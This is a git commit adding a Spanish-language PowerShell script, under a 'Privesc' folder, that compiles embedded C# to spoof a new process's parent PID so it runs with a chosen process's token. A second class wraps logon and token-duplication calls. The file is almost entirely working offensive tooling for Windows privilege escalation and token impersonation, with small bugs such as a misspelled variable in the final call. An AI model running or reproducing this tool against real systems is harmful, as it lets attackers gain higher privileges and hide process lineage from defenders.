8a2261e252c705e45759dfd51df73a98b501aa05
cybervaca <cybervaca@gmail.com>
2019-05-10 09:21:16 +0200

    Impersonaliza Proceso

---
+++ Privesc/Impersonaliza-Proceso.ps1
@@ -0,0 +1,411 @@
+﻿function Impersonaliza-Proceso {param ($Process_id,$Command)
+$help = @"
+.SYNOPSIS
+    Impersonaliza pasandole un PID y el comando a ejecutar.
+    PowerShell Function: Impersonaliza-Proceso
+    Author: N/A
+    Dependencias Requeridas: Ninguna
+    Dependencias Opcionales: Ninguna
+.DESCRIPTION
+    Impersonaliza-Proceso obtiene los permisos de un PID y ejecuta un comando con el token del PID.
+.EXAMPLE
+    Impersonaliza-Proceso -Process_id 721 -command cmd.exe -arguments "/k whoami"
+
+    Descripcion
+    -----------
+    Obtendra el token del proceso pid y ejecutara un proceso con dicho token.
+   
+"@
+
+if ($Process_id,$Command,$arguments -eq $null) {return "`n $help";break}
+$mycode = @"
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+
+public class Impersonaliza
+{
+    [DllImport("kernel32.dll")]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    static extern bool CreateProcess(
+        string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
+        ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
+        IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo,
+        out PROCESS_INFORMATION lpProcessInformation);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UpdateProcThreadAttribute(
+        IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
+        IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool InitializeProcThreadAttributeList(
+        IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool CloseHandle(IntPtr hObject);
+    
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    struct STARTUPINFOEX
+    {
+        public STARTUPINFO StartupInfo;
+        public IntPtr lpAttributeList;
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    struct STARTUPINFO
+    {
+        public Int32 cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public Int32 dwX;
+        public Int32 dwY;
+        public Int32 dwXSize;
+        public Int32 dwYSize;
+        public Int32 dwXCountChars;
+        public Int32 dwYCountChars;
+        public Int32 dwFillAttribute;
+        public Int32 dwFlags;
+        public Int16 wShowWindow;
+        public Int16 cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    internal struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SECURITY_ATTRIBUTES
+    {
+        public int nLength;
+        public IntPtr lpSecurityDescriptor;
+        public int bInheritHandle;
+    }
+
+	public static void CreateProcessFromParent(int ppid, string command)
+    {
+        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
+        const uint CREATE_NEW_CONSOLE = 0x00000010;
+		const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
+		
+
+        var pi = new PROCESS_INFORMATION();
+        var si = new STARTUPINFOEX();
+        si.StartupInfo.cb = Marshal.SizeOf(si);
+        IntPtr lpValue = IntPtr.Zero;
+
+        try
+        {
+            Process.EnterDebugMode();
+            var lpSize = IntPtr.Zero;
+            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
+            si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
+            InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, ref lpSize);
+            var phandle = Process.GetProcessById(ppid).Handle;
+            lpValue = Marshal.AllocHGlobal(IntPtr.Size);
+            Marshal.WriteIntPtr(lpValue, phandle);
+
+            UpdateProcThreadAttribute(
+                si.lpAttributeList,
+                0,
+                (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                lpValue,
+                (IntPtr)IntPtr.Size,
+                IntPtr.Zero,
+                IntPtr.Zero);
+            
+                   
+            var pattr = new SECURITY_ATTRIBUTES();
+            var tattr = new SECURITY_ATTRIBUTES();
+            pattr.nLength = Marshal.SizeOf(pattr);
+            tattr.nLength = Marshal.SizeOf(tattr);
+			var b= CreateProcess(command, null, ref pattr, ref tattr, false,EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi);
+			
+        }
+        finally
+        {
+            
+            if (si.lpAttributeList != IntPtr.Zero)
+            {
+                DeleteProcThreadAttributeList(si.lpAttributeList);
+                Marshal.FreeHGlobal(si.lpAttributeList);
+            }
+            Marshal.FreeHGlobal(lpValue);
+            
+            if (pi.hProcess != IntPtr.Zero)
+            {
+                CloseHandle(pi.hProcess);
+            }
+            if (pi.hThread != IntPtr.Zero)
+            {
+                CloseHandle(pi.hThread);
+            }
+        }
+    }
+
+}
+"@
+Add-Type -TypeDefinition $mycode
+$code = @"
+using System;
+using System.Collections.Generic;
+using System.Text;
+using System.Runtime.InteropServices;
+using Microsoft.Win32;
+using System.IO;
+using System.Security.Principal;
+using System.Security.Permissions;
+using Microsoft.Win32.SafeHandles;
+using System.Runtime.ConstrainedExecution;
+using System.Security;
+
+namespace Impersonalizador
+
+{
+
+    public static class Funciones
+
+    {
+
+        const UInt32 INFINITE = 0xFFFFFFFF;
+        const UInt32 WAIT_FAILED = 0xFFFFFFFF;
+        [Flags]
+        public enum LogonType
+
+        {
+
+            LOGON32_LOGON_INTERACTIVE = 2,
+            LOGON32_LOGON_NETWORK = 3,
+            LOGON32_LOGON_BATCH = 4,
+            LOGON32_LOGON_SERVICE = 5,
+            LOGON32_LOGON_UNLOCK = 7,
+            LOGON32_LOGON_NETWORK_CLEARTEXT = 8,
+            LOGON32_LOGON_NEW_CREDENTIALS = 9
+
+        }
+
+        [Flags]
+
+        public enum LogonProvider
+        {
+
+            LOGON32_PROVIDER_DEFAULT = 0,
+            LOGON32_PROVIDER_WINNT35,
+            LOGON32_PROVIDER_WINNT40,
+            LOGON32_PROVIDER_WINNT50
+        }
+
+	public enum TOKEN_TYPE
+        {
+            TokenPrimary = 1,
+            TokenImpersonation = 2
+        }
+
+	public enum SECURITY_IMPERSONATION_LEVEL
+        {
+            SecurityAnonymous = 0,
+            SecurityIdentification = 1,
+            SecurityImpersonation = 2,
+            SecurityDelegation = 3,
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct STARTUPINFO
+
+        {
+
+            public Int32 cb;
+            public String lpReserved;
+            public String lpDesktop;
+            public String lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+
+        }
+
+	[StructLayout(LayoutKind.Sequential)]
+	public struct SECURITY_ATTRIBUTES
+	{
+    	    public int nLength;
+    	    public IntPtr lpSecurityDescriptor;
+            public int bInheritHandle;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public Int32 dwProcessId;
+            public Int32 dwThreadId;
+
+        }
+
+        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern Boolean LogonUser
+        (
+
+            String lpszUserName,
+            String lpszDomain,
+            String lpszPassword,
+            LogonType dwLogonType,
+            LogonProvider dwLogonProvider,
+            out IntPtr phToken
+
+        );
+		
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern Boolean CreateProcessWithLogonW
+        (
+            String lpszUsername,
+            String lpszDomain,
+            String lpszPassword,
+            Int32 dwLogonFlags,
+            String applicationName,
+            String commandLine,
+            Int32 creationFlags,
+            IntPtr environment,
+            String currentDirectory,
+            ref STARTUPINFO sui,
+            out PROCESS_INFORMATION processInfo
+        );
+
+	[DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
+	public static extern Boolean DuplicateTokenEx
+	(
+            IntPtr hExistingToken,
+            uint dwDesiredAccess,
+            ref SECURITY_ATTRIBUTES lpTokenAttributes,
+            SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
+            TOKEN_TYPE TokenType,
+            out IntPtr phNewToken 
+        );
+
+				
+	[DllImport("advapi32.dll", SetLastError=true)]
+	public extern static Boolean DuplicateToken
+	(
+		IntPtr ExistingTokenHandle,
+		int SECURITY_IMPERSONATION_LEVEL,
+		ref IntPtr DuplicateTokenHandle
+	);
+
+	[DllImport("advapi32.dll", SetLastError=true)]
+	public extern static Boolean OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
+
+	[DllImport("advapi32.dll", SetLastError=true)]
+	public static extern bool SetThreadToken(IntPtr Thread, IntPtr Token);
+
+
+        [DllImport("kernel32", SetLastError=true)]
+        public static extern Boolean CloseHandle (IntPtr handle);
+
+	[DllImport("advapi32.dll", SetLastError = true)]
+        public static extern Boolean RevertToSelf();
+
+        public static IntPtr ImpersonateUser(string strCommand, string strDomain, string strName, string strPassword)
+
+        {
+
+            PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
+            STARTUPINFO startInfo = new STARTUPINFO();
+
+            bool bResult = false;
+
+            try
+
+            {
+
+                startInfo.cb = Marshal.SizeOf(startInfo);
+
+                bResult = CreateProcessWithLogonW(
+
+                    strName,
+                    strDomain,
+                    strPassword,
+                    0,
+                    null,
+                    strCommand,
+                    0,
+                    IntPtr.Zero,
+                    null,
+                    ref startInfo,
+                    out processInfo
+
+                );
+
+                if (!bResult) { throw new Exception("CreateProcessWithLogonW error #" + Marshal.GetLastWin32Error().ToString());}
+
+
+		IntPtr newToken = IntPtr.Zero;
+
+		bResult = OpenProcessToken(processInfo.hProcess, 0x6, out newToken);
+		if (!bResult) {
+			throw new Exception("Failed to grab token!");
+		}
+
+
+		IntPtr dup = IntPtr.Zero;
+		bResult = DuplicateToken(newToken, 2, ref dup); 
+
+		if (!bResult)
+		{
+			throw new Exception("DuplicateToken error #" + Marshal.GetLastWin32Error().ToString());
+		}
+		
+		return dup;
+            }
+
+            finally
+
+            {
+
+                // Close all handles
+
+                CloseHandle(processInfo.hProcess);
+
+                CloseHandle(processInfo.hThread);
+
+            }
+
+        }
+
+    }
+
+}
+"@
+
+Add-Type -TypeDefinition $code -Language CSHARP
+[Impersonaliza]::CreateProcessFromParent($Process_id,$Comand)
+
+}
